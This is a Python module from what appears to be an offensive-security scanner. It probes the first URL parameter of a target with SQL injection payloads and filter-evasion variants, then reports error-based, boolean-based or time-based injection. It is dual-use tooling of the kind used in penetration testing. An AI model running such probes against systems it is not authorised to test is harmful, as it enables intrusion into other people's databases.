import time
import requests
from colorama import Fore
from rich.console import Console
from utils.http_utils import send_request, parse_url_parameters
from modules.payloads import get_payloads, inject_payload

console = Console()

def detect_sql_injection(url, method="GET", post_data=None, technique="all", proxy=None):
    """Advanced SQL Injection Detection"""
    console.print(f"[cyan][*] Testing {url} for SQLi...[/cyan]")
    
    params = parse_url_parameters(url)
    if not params:
        console.print("[yellow][!] No parameters found in URL[/yellow]")
        return False, None, None
    
    param_name = list(params.keys())[0]  # Test first param
    
    original_response = send_request(url, method, post_data, proxy)
    if not original_response:
        console.print("[red][!] Cannot connect to target[/red]")
        return False, None, None
    
    original_length = len(original_response.text)
    
    payloads = get_payloads(technique)
    
    for payload in payloads:
        for bypass in ["", "/**/", "%20", "+"]:
            test_url = inject_payload(url, param_name, payload, bypass)
            
            start_time = time.time()
            response = send_request(test_url, method, post_data, proxy)
            end_time = time.time()
            
            if not response:
                continue
                
            new_length = len(response.text)
            time_diff = end_time - start_time
            
            # Error-based detection
            if any(err in response.text.lower() for err in ["sql", "mysql", "syntax", "odbc", "oracle"]):
                console.print(f"[green][+] Error-based SQLi found with payload: {payload}[/green]")
                return True, param_name, "error"
            
            # Boolean-based
            if abs(new_length - original_length) > 50 and "1=1" in payload:
                console.print(f"[green][+] Boolean-based SQLi detected[/green]")
                return True, param_name, "boolean"
            
            # Time-based
            if time_diff > 4 and "SLEEP" in payload.upper():
                console.print(f"[green][+] Time-based SQLi detected (delay: {time_diff:.2f}s)[/green]")
                return True, param_name, "time"
    
    console.print("[red][-] No SQL injection detected[/red]")
    return False, None, None
